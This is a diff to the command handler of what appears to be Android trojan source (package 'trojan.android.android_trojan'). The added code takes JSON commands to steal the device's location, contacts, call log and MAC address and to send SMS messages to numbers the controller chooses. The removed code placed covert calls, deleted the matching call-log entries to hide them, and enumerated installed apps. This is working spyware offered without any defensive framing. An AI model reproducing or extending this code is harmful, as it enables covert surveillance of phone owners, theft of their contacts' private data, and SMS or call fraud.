@@ -9,7 +9,6 @@ import android.graphics.drawable.Drawable;
 import android.location.Criteria;
 import android.location.Location;
 import android.location.LocationManager;
-import android.net.Uri;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.provider.CallLog;
@@ -18,66 +17,69 @@ import android.telephony.SmsManager;
 import android.util.Log;
 
 import java.util.ArrayList;
-import java.util.List;
+import java.util.Arrays;
 
 import org.json.*;
 
-import trojan.android.android_trojan.BroadcastReceiver.PhoneStateReceiver;
 
-/**
- * Created by hoodlums on 28/01/15.
- */
 public class ActionService {
 
     private static final String TAG = "ActionService";
     private Context context;
-
     public ActionService(Context context){
         this.context = context;
     }
+    private String result = null;
+
 
     public String action(String arg) {
         JSONObject argjson;
         try {
             argjson = new JSONObject(arg);
-            JSONArray array = argjson.getJSONArray("sendsms");
-            Log.d(TAG, String.valueOf(array.get(1).toString()));
+            getLocation(argjson);
+            getContacts(argjson);
+            getCallLog(argjson);
+            getMacAddress(argjson);
+            SendSMS(argjson);
         }catch (JSONException ex){
             Log.d(TAG, ex.getMessage());
+            this.result = "Error JSON";
         }
 
-
-
-        return "null";
-        /*
-        switch (argjson){
-            case "mac": return getMacAddress();
-            case "sendsms": return SendSMS();
-            default: return null;
-        }*/
+        return result;
     }
 
-    public double[] getLocation() {
+    public void getLocation(JSONObject argjson) {
+        if (!argjson.has("location")){
+            return;
+        }
+
         //Get location manager
         LocationManager locManager = (LocationManager) this.context.getSystemService(context.LOCATION_SERVICE);
         //get the best provider to obtain the current location
         Location location = locManager.getLastKnownLocation(locManager.getBestProvider(new Criteria(), false));
-        double[] result = new double[2];
+        String[] result = new String[2];
 
         //try to get latitude and longitude
         try {
-            result[0] = location.getAltitude();
-            result[1] = location.getLongitude();
+            result[0] = "Latitude " + String.valueOf(location.getLatitude());
+            result[1] = "Longitude " + String.valueOf(location.getLongitude());
         } catch (Exception ex) {//if this failed the method return 0,0
             Log.d(TAG, ex.getMessage());
-            result[0] = 0;
-            result[1] = 0;
+            result[0] = "0";
+            result[1] = "0";
         }
-        return result;
+
+
+        this.result = new JSONArray(Arrays.asList(result)).toString();
     }
 
 
-    public ArrayList getContacts() {
+    public void getContacts(JSONObject argjson) {
+        if (!argjson.has("contacts")){
+            return;
+        }
+
         ContentResolver cr = this.context.getContentResolver();
         Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                 null, null, null, null);
@@ -102,26 +104,14 @@ public class ActionService {
                 }
             }
         }
-        return contacts;
+        this.result = new JSONArray(contacts).toString();
     }
 
-    public void call(String num, long time) {
-        if (time > 1000) {
-            Intent intent = new Intent(Intent.ACTION_CALL);
-            intent.setData(Uri.parse("tel:" + num));
-            this.context.startActivity(intent);
-            Log.d(TAG, "Start call");
-            PhoneStateReceiver test = new PhoneStateReceiver();
-            Tools.sleep(time);
-            test.onReceive(this.context, intent);
-            test.killCall(this.context);
-            Log.d(TAG, "Stop call");
-            Tools.sleep(1000);
-            deleteCallLog(num);
+    public void getCallLog(JSONObject argjson) {
+        if (!argjson.has("calllogs")){
+            return;
         }
-    }
 
-    public ArrayList getCallLog() {
         ArrayList<String[]> callLog = new ArrayList<String[]>();
         String columns[] = new String[]{
                 CallLog.Calls._ID,
@@ -141,74 +131,35 @@ public class ActionService {
                 });
             } while (cursor.moveToNext());
         }
-        return callLog;
+        this.result = new JSONArray(callLog).toString();
     }
 
-    public void deleteCallLog(String num) {
-        String strNumberOne[] = {num};
-        Cursor cursor = this.context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, CallLog.Calls.NUMBER + " = ? ", strNumberOne, "");
-        if (cursor.moveToFirst()) {
-            do {
-                int idOfRowToDelete = cursor.getInt(cursor.getColumnIndex(CallLog.Calls._ID));
-                this.context.getContentResolver().delete(
-                        CallLog.Calls.CONTENT_URI,
-                        CallLog.Calls._ID + "= ? ",
-                        new String[]{String.valueOf(idOfRowToDelete)});
-            } while (cursor.moveToNext());
+
+    public void getMacAddress(JSONObject argjson) {
+        if (!argjson.has("mac")){
+            return;
         }
-    }
 
-    public String getMacAddress() {
         WifiManager manager = (WifiManager) this.context.getSystemService(Context.WIFI_SERVICE);
         WifiInfo info = manager.getConnectionInfo();
-        return info.getMacAddress();
+        this.result = info.getMacAddress();
     }
 
-    public void SendSMS(String numTelephone, String message) {
-        // permet de voir dans les log si la fct marche
-        Log.d(TAG, "SendSMS");
+    public void SendSMS(JSONObject argjson) throws JSONException {
+        if (!argjson.has("sendsms")){
+            return;
+        }
+
+        String numTelephone;
+        String message;
+
+        JSONArray array = argjson.getJSONArray("sendsms");
+        numTelephone = array.get(0).toString();
+        message = array.get(1).toString();
+
         SmsManager sms = SmsManager.getDefault();
         sms.sendTextMessage(numTelephone, null, message, null, null);
-    }
 
-
-    class PInfo {
-        private String appname = "";
-        private String pname = "";
-        private String versionName = "";
-        private int versionCode = 0;
-        private Drawable icon;
-
-        private void prettyPrint() {
-            Log.d(TAG, appname + "\t" + pname + "\t" + versionName + "\t" + versionCode);
-        }
-    }
-
-    public ArrayList<PInfo> getPackages() {
-        ArrayList<PInfo> apps = getInstalledApps(false); /* false = no system packages */
-        final int max = apps.size();
-        for (int i = 0; i < max; i++) {
-            apps.get(i).prettyPrint();
-        }
-        return apps;
-    }
-
-    public ArrayList<PInfo> getInstalledApps(boolean getSysPackages) {
-        ArrayList<PInfo> res = new ArrayList<PInfo>();
-        List<PackageInfo> packs = this.context.getPackageManager().getInstalledPackages(0);
-        for (int i = 0; i < packs.size(); i++) {
-            PackageInfo p = packs.get(i);
-            if ((!getSysPackages) && (p.versionName == null)) {
-                continue;
-            }
-            PInfo newInfo = new PInfo();
-            newInfo.appname = p.applicationInfo.loadLabel(this.context.getPackageManager()).toString();
-            newInfo.pname = p.packageName;
-            newInfo.versionName = p.versionName;
-            newInfo.versionCode = p.versionCode;
-            newInfo.icon = p.applicationInfo.loadIcon(this.context.getPackageManager());
-            res.add(newInfo);
-        }
-        return res;
+        this.result = "message send";
     }
 }
